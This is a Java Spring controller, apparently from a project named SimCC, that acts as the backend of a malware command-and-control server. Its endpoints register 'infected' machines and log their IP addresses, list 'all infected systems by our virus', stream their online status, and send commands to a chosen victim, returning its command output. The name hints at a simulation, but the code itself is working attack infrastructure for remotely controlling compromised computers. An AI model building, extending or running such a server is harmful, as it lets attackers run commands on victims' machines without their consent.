package at.simcc.simcc_backend.api.controller;

import at.simcc.simcc_backend.api.body.InfectedCommandResponse;
import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
import at.simcc.simcc_backend.api.service.InfectedService;
import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
import at.simcc.simcc_backend.api.ws.payload.CommandPayload;
import at.simcc.simcc_backend.models.InfectedIdDto;
import at.simcc.simcc_backend.models.InfectedWithLatestIPDto;
import jakarta.servlet.http.HttpServletRequest;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.validation.annotation.Validated;
import org.springframework.http.codec.ServerSentEvent;
import org.springframework.web.bind.annotation.*;
import reactor.core.publisher.Flux;
import tools.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.List;
import java.util.Optional;
import java.util.UUID;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.TimeoutException;

/**
 * Project: SimCC-Backend
 * Created by: Georg Kollegger
 * Date: 4/10/26
 */
@Slf4j
@RestController
@RequestMapping("/infected")
@RequiredArgsConstructor
public class InfectedController {
    private final InfectedService infectedService;
    private final InfectedSSEComponent infectedSSEComponent;
    private final ObjectMapper objMapper;

    /**
     * Route to register a newly infected machine
     * @param req {@link InfectedRegistrationRequest} containing a {@code ccid} to check alongside with meta data
     * @param http {@link HttpServletRequest} used to get the connecting ip address
     * @return 200 OK with the newly set {@code iid}
     */
    @PostMapping("/reg")
    public ResponseEntity<InfectedIdDto> registerInfected(@Validated @RequestBody InfectedRegistrationRequest req, HttpServletRequest http) {
        String ip = http.getHeader("X-Forwarded-For");
        if (ip != null) {
            ip = ip.split(",")[0].trim();
        } else {
            ip = http.getRemoteAddr();
        }

        Optional<Inet4Address> parsedIP = Optional.empty();

        try {
            InetAddress addr = InetAddress.getByName(ip);
            if (addr instanceof Inet4Address) { // IPv6 not supported yet
                parsedIP = Optional.of((Inet4Address) addr);
            }

        } catch (UnknownHostException e) {
            log.error("Failed to resolve ip {}", ip);
        }

        Optional<InfectedIdDto> infectedId = infectedService.registerInfected(req, parsedIP);
        return ResponseEntity.of(infectedId);

    }

    /**
     * Returns all infected systems by our virus
     */
    @GetMapping("/allInfected")
    public ResponseEntity<List<InfectedWithLatestIPDto>> getAllInfected(){
        return ResponseEntity.ok(infectedService.getAllInfected());
    }

    @GetMapping("/specificInfected")
    public ResponseEntity<InfectedWithLatestIPDto> getSpecificInfected(@RequestParam UUID uuid){
        InfectedWithLatestIPDto infected = infectedService.getAllInfected().stream()
                .filter(i -> i.getIid().equals(uuid))
                .findFirst()
                .orElse(null);

        return ResponseEntity.ok(infected);
    }

    /**
     * Register a Server-Side-Event to get notified when ever the infected goes offline.
     * @param iid {@code iid} of the infected
     * @return event of type {@code is-online} to
     */
    @GetMapping(path = "/sse/status", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    public Flux<ServerSentEvent<String>> streamFlux() {
        return infectedSSEComponent.getSseSink().asFlux()
                .map(event -> ServerSentEvent.<String>builder()
                        .id(UUID.randomUUID().toString())
                        .event("status.updated")
                        .data(objMapper.writeValueAsString(event))
                        .build()
                );
    }


    @PostMapping("/command/{iid}")
    public ResponseEntity<InfectedCommandResponse> commandInfected(@PathVariable UUID iid, @RequestBody CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
        CommandOutputPayload response = infectedService.sendMessage(iid, command);

        return ResponseEntity.ok(
                new InfectedCommandResponse(
                        response.getStdout(),
                        response.getStderr(),
                        response.getStatusCode()
                )
        );
    }
}
